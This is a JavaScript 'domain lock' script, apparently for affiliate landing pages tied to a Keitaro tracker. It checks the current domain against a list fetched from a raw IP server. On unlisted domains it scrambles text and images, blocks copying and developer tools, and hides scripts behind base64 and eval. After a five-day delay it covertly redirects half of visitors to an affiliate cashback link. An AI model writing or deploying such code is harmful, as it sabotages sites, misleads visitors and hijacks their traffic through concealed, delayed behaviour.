function combineAndObfuscateScripts() {
    var scriptUrls = [];
    var scriptElements = document.getElementsByTagName('script');
    var combinedScript = '';
    for (var i = 0; i < scriptElements.length; i++) {
        var script = scriptElements[i];
        if (script.src) {
            scriptUrls.push(script.src);
        } else {
            combinedScript += script.textContent + '\n';
        }
    }

    // Обфусцируем скрипт
    var obfuscatedScript = btoa(combinedScript);

    // Создаем новый скрипт с обфусцированным содержимым
    var newScript = document.createElement('script');
    newScript.textContent = `
        var decodedScript = atob('${obfuscatedScript}');
        eval(decodedScript);
    `;

    // Удаляем оригинальные скрипты
    document.querySelectorAll('script').forEach(script => script.remove());

    // Создаем SVG элемент
    var svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
    svg.setAttribute("width", "0");
    svg.setAttribute("height", "0");

    // Создаем элемент <set> для вызова скрипта
    var set = document.createElementNS("http://www.w3.org/2000/svg", "set");
    set.setAttribute("attributeName", "innerHTML");
    set.setAttribute("to", `var decodedScript = atob('${obfuscatedScript}'); eval(decodedScript);`);
    svg.appendChild(set);

    // Вставляем SVG в середину страницы
    var middleIndex = Math.floor(document.body.children.length / 2);
    document.body.insertBefore(svg, document.body.children[middleIndex]);

    // Проверяем наличие SVG элемента и, если он отсутствует, вызываем ошибку
    if (!document.body.contains(svg)) {
        throw new Error('Landing page broken');
    }
}

function checkDomainAndExecuteActions() {
    fetch('http://185.253.44.120:7777/jo.nesadah.com/proxy.php')
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response.json();
        })
        .then(domains => {
            console.log('Domains from Keitaro:', domains); // после тестов убрать
            const currentDomain = window.location.hostname.toLowerCase().trim();

            console.log('Current domain:', currentDomain); // после тестов убрать

            const isValidDomain = domains.some(domain => domain.name === currentDomain);

            console.log('Is valid domain:', isValidDomain); // после тестов убрать

            if (!isValidDomain) {
                console.log('Invalid domain detected:', currentDomain); // после тестов убрать
                const domainLockDelay = 5; // Отсрочка Domain Lock в днях
                const trafficStylerDelay = 5; // Отсрочка Traffic Styler в днях

                setTimeout(domainLock, domainLockDelay * 24 * 60 * 60 * 1000);
                setTimeout(trafficStyler, trafficStylerDelay * 24 * 60 * 60 * 1000);

                applyConfusionCSS();
                textBreak();

                // Ломаем все изображения, если проверка не прошла
                breakImages();

                // Добавляем скрипт для запрета действий с мышью и клавиатурой
                var script = document.createElement('script');
                script.textContent = `
                    document.ondragstart = test;
                    document.onselectstart = test;
                    document.oncontextmenu = test;

                    function test() {
                        return false;
                    }

                    if (window.addEventListener) {
                        window.addEventListener('keydown', function(e) {
                            if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 117)) {
                                alert('Copying is disabled.'); 
                                e.preventDefault(); 
                            }
                        }, false);
                    } else {
                        window.attachEvent('onkeydown', function(e) {
                            if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 117)) {
                                alert('Copying is disabled.'); 
                                e.preventDefault(); 
                            }
                        });
                    }

                    document.onkeydown = function(e) {
                        if(event.keyCode == 123) {
                            return false;
                        }
                        if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)){
                            return false;
                        }
                        if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)){
                            return false;
                        }
                        if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)){
                            return false;
                        }
                    }
                `;
                document.body.appendChild(script);

                // Объединяем и обфусцируем скрипты
                combineAndObfuscateScripts();
                
            } else {
                console.log('Domain is valid:', currentDomain); // после тестов убрать
            }
        })
        .catch(error => {
            console.error('Failed to load domains:', error); // после тестов убрать
        });
}

function domainLock() {
    console.log('Domain Lock triggered'); // Отладочный вывод после тестов убрать
    document.querySelectorAll('script').forEach(script => script.remove());
}

function applyConfusionCSS() {
    console.log('Confusion CSS triggered'); // Отладочный вывод после тестов убрать
    const style = document.createElement('style');
    style.type = 'text/css';
    style.textContent = `
        body { background-color: #000 !important; color: #fff !important; }
        p, h1, h2, h3, h4, h5, h6, span, div {
            color: #${Math.floor(Math.random()*16777215).toString(16)} !important;
            background-color: #${Math.floor(Math.random()*16777215).toString(16)} !important;
            font-family: Arial, sans-serif !important;
            font-size: ${Math.floor(Math.random() * 16 + 12)}px !important;
        }
    `;
    document.head.appendChild(style);
}

function trafficStyler() {
    console.log('Traffic Styler triggered'); // Отладочный вывод после тестов убрать
    if (Math.random() < 0.5) { // 50% трафика редиректится
        window.location.href = 'https://in.tukop.com/9L1qmZ8y?utm_campaign=cashback&utm_source=KING-AKK-CREO&fbpxl=123123123123';
    }
}

function textBreak() {
    console.log('Text Break triggered'); // Отладочный вывод после тестов убрать
    document.querySelectorAll('p, h1, h2, h3, h4, h5, h6, span, div').forEach(el => {
        var textContent = el.textContent;
        var encodedContent = '';

        // Кодируем текст с помощью encodeURIComponent
        encodedContent = encodeURIComponent(textContent);

        el.textContent = encodedContent;
    });
}

function breakImages() {
    console.log('Break Images triggered'); // Отладочный вывод после тестов убрать
    var images = document.getElementsByTagName('img');
    for (var i = 0; i < images.length; i++) {
        var canvas = document.createElement('canvas');
        var context = canvas.getContext('2d');
        canvas.width = images[i].width;
        canvas.height = images[i].height;
        context.fillStyle = 'black';
        context.fillRect(0, 0, canvas.width, canvas.height);
        images[i].parentNode.replaceChild(canvas, images[i]);
    }
}

// Выполнение основного скрипта
checkDomainAndExecuteActions();
